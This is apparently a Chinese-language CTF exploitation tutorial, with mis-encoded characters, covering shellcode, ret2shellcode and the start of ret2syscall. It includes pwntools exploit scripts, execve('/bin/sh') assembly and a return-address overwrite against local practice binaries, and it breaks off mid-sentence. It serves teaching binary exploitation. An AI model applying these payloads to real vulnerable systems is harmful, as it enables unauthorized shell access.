    <content type="html"><![CDATA[<h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><p>shellcode æŒ‡çš„æ˜¯ç”¨äºå®ŒæˆæŸä¸ªåŠŸèƒ½çš„æ±‡ç¼–ä»£ç ï¼Œå¸¸è§çš„åŠŸèƒ½ä¸»è¦æ˜¯è·å–ç›®æ ‡ç³»ç»Ÿçš„ shellã€‚<strong>é€šå¸¸æƒ…å†µä¸‹ï¼Œshellcode éœ€è¦æˆ‘ä»¬è‡ªè¡Œç¼–å†™ï¼Œå³æ­¤æ—¶æˆ‘ä»¬éœ€è¦è‡ªè¡Œå‘å†…å­˜ä¸­å¡«å……ä¸€äº›å¯æ‰§è¡Œçš„ä»£ç </strong>ã€‚</p><h2 id="shellcodeä¾‹é¢˜"><a href="#shellcodeä¾‹é¢˜" class="headerlink" title="shellcodeä¾‹é¢˜"></a>shellcodeä¾‹é¢˜</h2><p>checksecæ£€æŸ¥ç¨‹åºçš„ä¿æŠ¤æœºåˆ¶ï¼Œå¤§éƒ¨åˆ†ä¿æŠ¤éƒ½æ²¡å¼€ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸»è¦å…³æ³¨NXä¿æŠ¤</p><img src="/post/10828/1731743811985-867299b7-0d83-4047-8978-623eff9b410e.png" class="" title="img"><p>ä¿æŠ¤æœºåˆ¶çš„ä¸€äº›ä»‹ç»ï¼š</p><ul><li><p><strong>RELROï¼ˆRELocation Read-Onlyï¼‰</strong>ï¼šRELRO æ˜¯ä¸€ç§æŠ€æœ¯ï¼Œç”¨äºåœ¨æ‰§è¡Œæ–‡ä»¶æ—¶å°†ä¸€éƒ¨åˆ†é‡å®šä½ä¿¡æ¯æ ‡è®°ä¸ºåªè¯»ï¼Œä»¥é˜²æ­¢æ¶æ„åˆ©ç”¨ã€‚RELRO æä¾›äº†ä¸€ç§æœºåˆ¶ï¼Œç¡®ä¿æŸäº›é‡å®šä½è¡¨é¡¹åœ¨ç¨‹åºè¿è¡Œæ—¶ä¸å¯ä¿®æ”¹ï¼Œä»è€Œå¢åŠ äº†ç¨‹åºçš„å®‰å…¨æ€§ã€‚</p></li><li><p><strong>Stack Protectionï¼ˆæ ˆä¿æŠ¤ï¼‰</strong>ï¼šæ ˆä¿æŠ¤æŠ€æœ¯æ—¨åœ¨é˜²æ­¢ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ã€‚å…¶ä¸­åŒ…æ‹¬ä¸€äº›æŠ€æœ¯ï¼Œå¦‚å †æ ˆä¿æŠ¤ï¼ˆStack Smashing Protectionï¼ŒSSPï¼‰å’Œå †æ ˆéšæœºåŒ–ï¼ˆStack Randomizationï¼‰ï¼Œç”¨äºæ£€æµ‹å’Œé˜»æ­¢å¯¹å‡½æ•°è¿”å›åœ°å€ç­‰å…³é”®æ•°æ®çš„ä¿®æ”¹ã€‚</p></li><li><p><strong>NXï¼ˆNo eXecuteï¼‰</strong>ï¼šNX æ˜¯ä¸€ç§ç¡¬ä»¶çº§åˆ«çš„æŠ€æœ¯ï¼Œç”¨äºé˜²æ­¢æ•°æ®åŒºåŸŸè¢«å½“ä½œæŒ‡ä»¤åŒºåŸŸæ‰§è¡Œï¼Œä»è€Œæœ‰æ•ˆé˜²æ­¢é’ˆå¯¹ç¼“å†²åŒºæº¢å‡ºçš„æ”»å‡»ï¼Œå¦‚ shellcode æ³¨å…¥ã€‚</p></li><li><p><strong>PIEï¼ˆPosition Independent Executableï¼‰</strong>ï¼šPIE æ˜¯ä¸€ç§æŠ€æœ¯ï¼Œä½¿å¾—ç¨‹åºçš„åŠ è½½åœ°å€åœ¨æ¯æ¬¡æ‰§è¡Œæ—¶éƒ½æ˜¯éšæœºçš„ï¼Œè¿™æ ·å¯ä»¥æœ‰æ•ˆé˜²æ­¢æ”»å‡»è€…åˆ©ç”¨å·²çŸ¥çš„å†…å­˜åœ°å€ä¿¡æ¯æ¥æ‰§è¡Œæ”»å‡»ã€‚</p></li></ul><p>æ¥ä¸‹æ¥æˆ‘ä»¬åœ¨idaä¸­æ‰“å¼€ç¨‹åºï¼Œå½“æˆ‘ä»¬æŒ‰ä¸‹F5ä¹‹åå¹¶æ²¡æœ‰è·³è½¬åˆ°ä¼ªä»£ç ç•Œé¢è€Œæ˜¯ç»™å‡ºäº†è­¦å‘Š</p><img src="/post/10828/1731743812050-61ef9f19-507b-4152-a6e0-d540251b39bd.png" class="" title="img"><p>è¿™ä¸ªè­¦å‘Šå®é™…ä¸Šç”±äºç¨‹åºå‡ºç°äº†ä¸€äº›idaæ— æ³•è§£æçš„æŒ‡ä»¤ï¼Œå³<code>call rdx</code>è¿™æ¡æŒ‡ä»¤</p><img src="/post/10828/1731743812117-e34fad5e-27f5-4c72-8250-bcb0a3378ea4.png" class="" title="img"><p>ä¸‹é¢ä»‹ç»å¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜</p><p>åœ¨èœå•æ ç‚¹å‡»<strong>Edit</strong>ï¼Œæ¥ç€æ‰¾åˆ°<strong>Patch program</strong>ï¼Œç„¶åé€‰æ‹©<strong>Assembleâ€¦</strong></p><img src="/post/10828/1731743812190-d13e3533-569b-4e80-99a2-822253b5cb7d.png" class="" title="img"><p>è¿™æ—¶ä¼šè·³å‡ºä¸€ä¸ªçª—å£ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹Assemblyè¿™ä¸€æ </p><img src="/post/10828/1731743812257-2036e11d-fd33-4172-a899-6bd053adc905.png" class="" title="img"><p>æˆ‘ä»¬å°†rdxæ”¹ä¸ºrcxï¼Œç„¶åæŒ‰ä¸‹å›è½¦ï¼Œå¯ä»¥å‘ç°æ­¤æ—¶<code>call rdx</code>å·²ç»å˜æˆ<code>call rcx</code></p><img src="/post/10828/1731743812361-9655fd44-559d-4d58-b607-3aca70285b6d.png" class="" title="img"><p>ä¹‹åæˆ‘ä»¬å†æŒ‰ä¸‹F5å°±ä¼šè·³è½¬åˆ°ä¼ªä»£ç ç•Œé¢</p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œmainå‡½æ•°çš„é€»è¾‘å¾ˆæ¸…æ™°ã€‚æˆ‘ä»¬å‘ç°readå‡½æ•°è¯»å…¥äº†0x100å­—èŠ‚ï¼Œè€Œå­—ç¬¦æ•°ç»„bufè·ç¦»rbpå´æ˜¯0x110ï¼Œè¿™æ˜¾ç„¶ä¸èƒ½é€ æˆæº¢å‡ºã€‚æˆ‘ä»¬è¿˜æ³¨æ„åˆ°äº†<code>v3(0LL, buf, buf)</code>è¿™æ¡è¯­å¥ï¼Œè¿™æ¡è¯­å¥å®é™…æ˜¯é€šè¿‡ä¸€ä¸ªæŒ‡é’ˆæ¥è°ƒç”¨äº†ä¸€ä¸ªå‡½æ•°ï¼Œå®ç°çš„æ•ˆæœæ˜¯å…è®¸æ‰§è¡Œä»»æ„ç”¨æˆ·è¾“å…¥çš„ä»£ç ã€‚é‚£ä¹ˆå¦‚æœæˆ‘ä»¬å°†æ±‡ç¼–ä»£ç å†™åˆ°bufä¸­ï¼Œç„¶ååˆ©ç”¨è¿™ä¸ªæŒ‡é’ˆå°±å¯ä»¥è·å–åˆ°æ§åˆ¶æƒ</p><img src="/post/10828/1731743812439-d45975d6-2688-4372-968b-c960bfbbe5fa.png" class="" title="img"><p>æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨gdbè¿›è¡Œè°ƒè¯•</p><p>ç›´æ¥è¾“å…¥start</p><img src="/post/10828/1731743812495-186bdde3-954e-4266-bd8b-b394a3c642c5.png" class="" title="img"><p>æ¥ç€è¾“å…¥vmmapæ¥æŸ¥çœ‹ç¨‹åºå†…å­˜å¸ƒå±€ï¼Œå¯ä»¥çœ‹åˆ°[stack]åŒºåŸŸæœ‰rwxæƒé™ã€‚</p><img src="/post/10828/1731743812568-d0cdd9e8-aabb-410a-9cb6-59459f980bf6.png" class="" title="img"><img src="/post/10828/1731743812633-b2f8bdd5-d14e-4e08-a426-08c59fb27987.png" class="" title="img"><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ©ç”¨pwntoolsåº“ä¸­çš„shelcraft.sh()ç›´æ¥ç”Ÿæˆæ±‡ç¼–ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>p = process(<span class="hljs-string">&quot;./shellcode&quot;</span>)<br><br><span class="hljs-comment"># attach(p)</span><br>payload = asm(shellcraft.sh())<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥æ‰‹å†™æ±‡ç¼–ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>p = process(<span class="hljs-string">&quot;./shellcode&quot;</span>)<br><br><span class="hljs-comment"># attach(p)</span><br><span class="hljs-comment">#execve(&#x27;/bin/sh&#x27;, 0, 0)</span><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rbx, 0x68732f6e69622f  #/bin/shçš„åå…­è¿›åˆ¶ï¼š2f 62 69 6e 2f 73 68</span><br><span class="hljs-string">    push rbx</span><br><span class="hljs-string">    mov rdi, rsp               #å°†/bin/shèµ‹å€¼ç»™rdi</span><br><span class="hljs-string">    xor rsi, rsi   #å°†rsiç½®0ç›¸å½“äºmov rsi, 0</span><br><span class="hljs-string">    xor rdx, rdx               #å°†rdxç½®0ç›¸å½“äºmov rdx, 0</span><br><span class="hljs-string">    mov rax, 59   #å°†59èµ‹å€¼ç»™rax</span><br><span class="hljs-string">    syscall   #æ‰§è¡Œç³»ç»Ÿè°ƒç”¨</span><br><span class="hljs-string">  &#x27;&#x27;&#x27;</span>)<br><br>p.sendline(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œè„šæœ¬ï¼ŒæˆåŠŸè·å–æ§åˆ¶</p><img src="/post/10828/1731743812726-030ef62c-5428-46b7-aa46-2780f8f7122e.png" class="" title="img"><h2 id="gdbè°ƒè¯•"><a href="#gdbè°ƒè¯•" class="headerlink" title="gdbè°ƒè¯•"></a>gdbè°ƒè¯•</h2><p>æˆ‘ä»¬é€šè¿‡è°ƒè¯•æ¥çœ‹ä¸€ä¸‹è„šæœ¬çš„æ‰§è¡Œæµç¨‹ï¼Œé€‰ç”¨ç¬¬äºŒä¸ªè„šæœ¬ï¼Œç„¶ååŠ å…¥attachè°ƒè¯•è¯­å¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>p = process(<span class="hljs-string">&quot;./shellcode&quot;</span>)<br><br>attach(p)<br><span class="hljs-comment">#execve(&#x27;/bin/sh&#x27;, 0, 0)</span><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rbx, 0x68732f6e69622f  #/bin/shçš„åå…­è¿›åˆ¶ï¼š2f 62 69 6e 2f 73 68</span><br><span class="hljs-string">    push rbx</span><br><span class="hljs-string">    mov rdi, rsp               #å°†/bin/shèµ‹å€¼ç»™rdi</span><br><span class="hljs-string">    xor rsi, rsi   #å°†rsiç½®0ç›¸å½“äºmov rsi, 0</span><br><span class="hljs-string">    xor rdx, rdx               #å°†rdxç½®0ç›¸å½“äºmov rdx, 0</span><br><span class="hljs-string">    mov rax, 59   #å°†59èµ‹å€¼ç»™rax</span><br><span class="hljs-string">    syscall   #æ‰§è¡Œç³»ç»Ÿè°ƒç”¨</span><br><span class="hljs-string">  &#x27;&#x27;&#x27;</span>)<br><br>p.sendline(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>ç›´æ¥è¿è¡Œè„šæœ¬ï¼Œç„¶ååœ¨è°ƒè¯•çª—å£ï¼Œè¾“å…¥ni</p><img src="/post/10828/1731743813570-54673aa4-d32e-48ca-a64c-725af9daea56.png" class="" title="img"><p>åŒæ—¶æˆ‘ä»¬æ³¨æ„è§‚å¯Ÿæ±‡ç¼–ä»£ç éƒ¨åˆ†</p><img src="/post/10828/1731743812802-03fc1015-edca-411b-bdbe-abb44fb7b270.png" class="" title="img"><p>æ¥ç€æˆ‘ä»¬è¾“å…¥å›è½¦ï¼Œç›´è‡³ç¨‹åºè¿è¡Œåˆ°<code>call rdx</code>å¤„</p><img src="/post/10828/1731743812864-d35c8a71-4a67-4aa2-9f4a-9f6e103118eb.png" class="" title="img"><p>è¿™æ—¶æˆ‘ä»¬è¾“å…¥si</p><img src="/post/10828/1731743813637-b56bc930-b60f-4dab-a8ee-d2763a6142a0.png" class="" title="img"><p>æˆ‘ä»¬å†æŸ¥çœ‹æ±‡ç¼–ä»£ç éƒ¨åˆ†ï¼Œå¯ä»¥çœ‹åˆ°ç¨‹åºå¼€å§‹æ‰§è¡Œæˆ‘ä»¬ç¼–å†™çš„æ±‡ç¼–ä»£ç </p><img src="/post/10828/1731743812942-1a98cdc2-2d79-4f3d-94e9-51b8959f7624.png" class="" title="img"><h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><p>ret2shellcodeæ˜¯æŒ‡æ”»å‡»è€…éœ€è¦è‡ªå·±å°†è°ƒç”¨shellçš„æœºå™¨ç ï¼ˆä¹Ÿç§°shellcodeï¼‰æ³¨å…¥è‡³å†…å­˜ä¸­ï¼Œéšååˆ©ç”¨æ ˆæº¢å‡ºè¦†å†™return_addressï¼Œè¿›è€Œä½¿ç¨‹åºè·³è½¬è‡³shellcodeæ‰€åœ¨å†…å­˜ã€‚</p><p>è¦å®ç°ä¸Šè¿°ç›®çš„ï¼Œå°±å¿…é¡»åœ¨å†…å­˜ä¸­æ‰¾åˆ°ä¸€ä¸ªå¯å†™ï¼ˆè¿™å…è®¸æˆ‘ä»¬æ³¨å…¥shellcodeï¼‰ä¸”å¯æ‰§è¡Œï¼ˆè¿™å…è®¸æˆ‘ä»¬æ‰§è¡Œshellcodeï¼‰çš„æ®µï¼Œå¹¶ä¸”éœ€è¦çŸ¥é“å¦‚ä½•ä¿®æ”¹è¿™äº›æ®µçš„å†…å®¹ã€‚ä¸åŒçš„ç¨‹åºåŠæ“ä½œç³»ç»Ÿé‡‡å–çš„ä¿æŠ¤æªæ–½ä¸å°½ç›¸åŒï¼Œå› æ­¤å¦‚ä½•æ³¨å…¥shellcodeä¹Ÿåº”å½“çµæ´»é€‰æ‹©ã€‚</p><h2 id="ret2shellcodeä¾‹é¢˜"><a href="#ret2shellcodeä¾‹é¢˜" class="headerlink" title="ret2shellcodeä¾‹é¢˜"></a>ret2shellcodeä¾‹é¢˜</h2><p>checksecæ£€æŸ¥ç¨‹åº</p><img src="/post/10828/1731743813017-c5f593af-5083-4002-aae3-a4497d7afd6d.png" class="" title="img"><p>idaæ‰“å¼€ï¼Œå¯ä»¥çœ‹åˆ°å­—ç¬¦æ•°ç»„sè·ç¦»rbpä¸º0x100å­—èŠ‚ï¼Œè€Œreadå¯ä»¥è¯»å…¥0x110å­—èŠ‚ï¼Œå› æ­¤å­˜åœ¨æ ˆæº¢å‡ºã€‚æˆ‘ä»¬è¿˜æ³¨æ„åˆ°strcpyå‡½æ•°å°†å­—ç¬¦æ•°ç»„å¤åˆ¶åˆ°äº†buffä¸­</p><img src="/post/10828/1731743813088-7eff206c-625e-4107-99de-d2d7ee5062a8.png" class="" title="img"><p>æˆ‘ä»¬æ¥æŸ¥çœ‹ä¸€ä¸‹buffï¼ŒåŒå‡»buffä¹‹åä¼šè·³è½¬åˆ°æ±‡ç¼–ä»£ç ç•Œé¢ï¼Œå¯ä»¥çœ‹åˆ°buffæ˜¯ä½äºbssæ®µ</p><img src="/post/10828/1731743813175-0e69ebca-78a3-4705-be34-8d3a1503d53c.png" class="" title="img"><p>æˆ‘ä»¬å›åˆ°mainå‡½æ•°ï¼Œæ³¨æ„åˆ°mainå‡½æ•°ä¸­è¿˜è°ƒç”¨äº†mprotectå‡½æ•°ã€‚</p><img src="/post/10828/1731743813247-b31fa984-bd7f-4040-b1bd-af581a0cd3a6.png" class="" title="img"><p>åœ¨Linuxä¸­ï¼Œmprotect()å‡½æ•°å¯ä»¥ç”¨æ¥ä¿®æ”¹ä¸€æ®µæŒ‡å®šå†…å­˜åŒºåŸŸçš„ä¿æŠ¤å±æ€§ã€‚</p><p>å‡½æ•°åŸå‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span>   </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mmap.h&gt;</span>   </span><br><span class="hljs-comment">//mprotect()å‡½æ•°æŠŠè‡ªstartå¼€å§‹çš„ã€é•¿åº¦ä¸ºlençš„å†…å­˜åŒºçš„ä¿æŠ¤å±æ€§ä¿®æ”¹ä¸ºprotæŒ‡å®šçš„å€¼ã€‚</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">mprotect</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *start, <span class="hljs-type">size_t</span> len, <span class="hljs-type">int</span> prot)</span>;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬åŒå‡»stdoutæŸ¥çœ‹ï¼Œå¯ä»¥çœ‹åˆ°å…¶ä½äºbssæ®µã€‚é‚£ä¹ˆæ˜¾è€Œæ˜“è§çš„ï¼Œmprotectå‡½æ•°å°†bsså¼€å§‹çš„0x1000å¤§å°çš„çš„åŒºåŸŸè®¾ç½®ä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œï¼ˆ7å¯¹åº”çš„äºŒè¿›åˆ¶æ˜¯111ï¼Œåˆ†åˆ«å¯¹åº”è¯»ã€å†™å’Œæ‰§è¡Œæƒé™ï¼‰</p><img src="/post/10828/1731743813306-42c3ee98-9f91-44f6-890c-1408e962ba1f.png" class="" title="img"><p>ç»¼ä¸Šæ‰€è¯‰ï¼Œæˆ‘ä»¬å¯ä»¥å°†shellcodeå†™åˆ°å­—ç¬¦æ•°ç»„sä¸­ï¼Œç„¶åå°†è¿”å›åœ°å€ä¿®æ”¹ä¸ºbuffï¼Œè¿™æ ·ç¨‹åºä¼šå…ˆå°†å­—ç¬¦æ•°ç»„så¤åˆ¶åˆ°buffä¸­ï¼Œæ­¤æ—¶buffä¸­å°±æœ‰äº†shellcodeï¼Œæ¥ç€ç¨‹åºæ‰§è¡Œåˆ°è¿”å›åœ°å€æ—¶ä¼šè¿”å›åˆ°buffä¸­ï¼Œç„¶åç¨‹åºå°±ä¼šæ‰§è¡Œbuffä¸­çš„shellcode</p><p>æ ˆå¸ƒå±€å›¾å¦‚ä¸‹</p><img src="/post/10828/1731743813390-42fe1ca5-8956-4d8a-9990-47e08554a7b6.png" class="" title="img"><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>)<br><br>buff = <span class="hljs-number">0x4040A0</span><br><br>attach(p)<br>shellcode = asm(shellcraft.sh())<br>shellcode = shellcode.ljust(<span class="hljs-number">0x108</span>, <span class="hljs-string">b&#x27;a&#x27;</span>) + p64(buff)<br>p.send(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œexp</p><img src="/post/10828/1731743813496-e2d57552-d479-43c0-bb83-58f5b20ffa2a.png" class="" title="img"><h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>ret2syscallï¼Œå³æ§åˆ¶ç¨‹åºæ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œè·å– shellã€‚</p><p>ç³»ç»Ÿè°ƒç”¨æ˜¯æŒ‡ç”±æ“ä½œç³»ç»Ÿæä¾›çš„ä¾›æ‰€æœ‰ç³»ç»Ÿè°ƒç”¨çš„ç¨‹åºæ¥å£é›†åˆï¼Œç”¨æˆ·ç¨‹åºé€šå¸¸åªåœ¨ç”¨æˆ·æ€ä¸‹è¿è¡Œï¼Œå½“ç”¨æˆ·ç¨‹åºæƒ³è¦è°ƒç”¨åªèƒ½åœ¨å†…æ ¸æ€è¿è¡Œçš„å­ç¨‹åºæ—¶ï¼Œæ“ä½œç³»ç»Ÿéœ€è¦æä¾›è®¿é—®è¿™äº›å†…æ ¸æ€è¿è¡Œçš„ç¨‹åºçš„æ¥å£ï¼Œè¿™äº›æ¥å£çš„é›†åˆå°±å«åšç³»ç»Ÿè°ƒç”¨ï¼Œç®€è¦çš„è¯´ï¼Œç³»ç»Ÿè°ƒç”¨æ˜¯å†…æ ¸å‘ç”¨æˆ·è¿›ç¨‹æä¾›æœåŠ¡çš„å”¯ä¸€æ–¹æ³•ã€‚</p><h2 id="32-ä½ä¾‹é¢˜"><a href="#32-ä½ä¾‹é¢˜" class="headerlink" title="32 ä½ä¾‹é¢˜"></a>32 ä½ä¾‹é¢˜</h2><p>checksec æ£€æŸ¥ç¨‹åºä¿æŠ¤æœºåˆ¶ï¼Œç¨‹åºå¼€å¯äº† NX ä¿æŠ¤</p><img src="/post/10828/1734009466920-66d95d0e-6d52-4c9b-a493-a7a671e82559.png" class="" title="img"><p>æ­¤æ—¶ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ç”¨ <code>file</code> å‘½ä»¤æ¥æŸ¥çœ‹æ–‡ä»¶çš„å…¶ä»–ä¿¡æ¯ï¼›å¯ä»¥çœ‹åˆ°ï¼Œè¿™æ˜¯ä¸€ä¸ªé™æ€é“¾æ¥çš„ç¨‹åº</p><p>é™æ€é“¾æ¥æ˜¯ç”±é“¾æ¥å™¨åœ¨é“¾æ¥æ—¶å°†åº“çš„å†…å®¹åŠ å…¥åˆ°å¯æ‰§è¡Œç¨‹åºä¸­çš„åšæ³•ã€‚</p><p>é“¾æ¥å™¨æ˜¯ä¸€ä¸ªç‹¬ç«‹ç¨‹åºï¼Œå°†ä¸€ä¸ªæˆ–å¤šä¸ªåº“æˆ–ç›®æ ‡æ–‡ä»¶ï¼ˆå…ˆå‰ç”±ç¼–è¯‘å™¨æˆ–æ±‡ç¼–å™¨ç”Ÿæˆï¼‰é“¾æ¥åˆ°ä¸€å—ç”Ÿæˆå¯æ‰§è¡Œç¨‹åºã€‚</p><p>ç®€å•çš„è®²ï¼Œé™æ€é“¾æ¥å°±æ˜¯åœ¨ç¼–è¯‘æ—¶å°†æ‰€æœ‰éœ€è¦çš„æ¨¡å—ï¼ˆåŒ…æ‹¬åº“æ–‡ä»¶ï¼‰ç›´æ¥ç¼–è¯‘è¿›å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚</p><img src="/post/10828/1734009467015-4655c41e-c4ec-4dbc-b3f8-29614c690eca.png" class="" title="img"><p>ida æ‰“å¼€ï¼Œå¯ä»¥çœ‹åˆ°åœ¨å‡½æ•°è¿™ä¸€æ æœ‰å¾ˆå¤šå‡½æ•°ï¼Œè¿™å°±æ˜¯é™æ€é“¾æ¥ç¨‹åºçš„ç‰¹å¾</p><img src="/post/10828/1734009467075-8a362beb-60f3-4a69-ab0e-d540edc20191.png" class="" title="img"><p>æˆ‘ä»¬è¿›å…¥ main å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ gets å‡½æ•°ï¼Œå­˜åœ¨æ ˆæº¢å‡ºã€‚å½“æˆ‘ä»¬å†æŸ¥çœ‹å…¶ä»–å‡½æ•°æ—¶æˆ‘ä»¬å¹¶æ²¡æœ‰å…¶ä»–æ”¶è·ï¼Œå³ç¨‹åºä¸­ä¸å­˜åœ¨ system(â€˜&#x2F;bin&#x2F;shâ€™)ï¼Œä¹Ÿæ— æ³•è¿›è¡Œ shellcode åˆ©ç”¨ã€‚</p><img src="/post/10828/1734009467156-11114138-0761-48f1-942f-b23bee45ea6a.png" class="" title="img"><p>æˆ‘ä»¬æƒ³è¦åˆ©ç”¨è¿™ä¸ªç¨‹åºä¸­çš„æ¼æ´æ¥è·å–åˆ° shellï¼Œå°±éœ€è¦åˆ©ç”¨åˆ°ç³»ç»Ÿè°ƒç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆç®€å•äº†è§£ä¸€ä¸‹ 32 ä½ç¨‹åºä¸­çš„ä¸€äº›ç³»ç»Ÿè°ƒç”¨çŸ¥è¯†ã€‚</p><p>Linux åœ¨x86ä¸Šçš„ç³»ç»Ÿè°ƒç”¨é€šè¿‡ int 80h å®ç°ï¼Œç”¨ç³»ç»Ÿè°ƒç”¨å·æ¥åŒºåˆ†å…¥å£å‡½æ•°ã€‚åº”ç”¨ç¨‹åºè°ƒç”¨ç³»ç»Ÿè°ƒç”¨çš„è¿‡ç¨‹æ˜¯ï¼š</p><ol><li><p>æŠŠç³»ç»Ÿè°ƒç”¨çš„ç¼–å·å­˜å…¥ EAXï¼›</p></li><li><p>æŠŠå‡½æ•°å‚æ•°å­˜å…¥å…¶å®ƒé€šç”¨å¯„å­˜å™¨ï¼›</p></li><li><p>è§¦å‘ 0x80 å·ä¸­æ–­ï¼ˆint 0x80ï¼‰ã€‚</p></li></ol><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç³»ç»Ÿè°ƒç”¨ execve å‡½æ•°æ¥è·å– shellï¼Œexecve å‡½æ•°åŸå‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">execve</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[], <span class="hljs-type">char</span> *<span class="hljs-type">const</span> envp[])</span>;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å‘ç° execve å‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¸‰ä¸ªå¯„å­˜å™¨æ¥ä½¿å¾—æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ä¸‰ä¸ªå‚æ•°çš„å€¼ï¼Œä»è€Œå®ç°ä»¥ä¸‹ç³»ç»Ÿè°ƒç”¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>ç”±äºæˆ‘ä»¬éœ€è¦å°†ç³»ç»Ÿè°ƒç”¨å·å­˜å…¥ eax ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬æ€»å…±éœ€è¦å››ä¸ªå¯„å­˜å™¨ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿å¾—</p><ul><li><p>ç³»ç»Ÿè°ƒç”¨å·ï¼Œå³ eax åº”è¯¥ä¸º 0xb</p></li><li><p>ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³ ebx åº”è¯¥æŒ‡å‘ &#x2F;bin&#x2F;sh çš„åœ°å€ï¼Œæˆ–è€… sh çš„åœ°å€ä¹Ÿå¯ä»¥ã€‚</p></li><li><p>ç¬¬äºŒä¸ªå‚æ•°ï¼Œå³ ecx 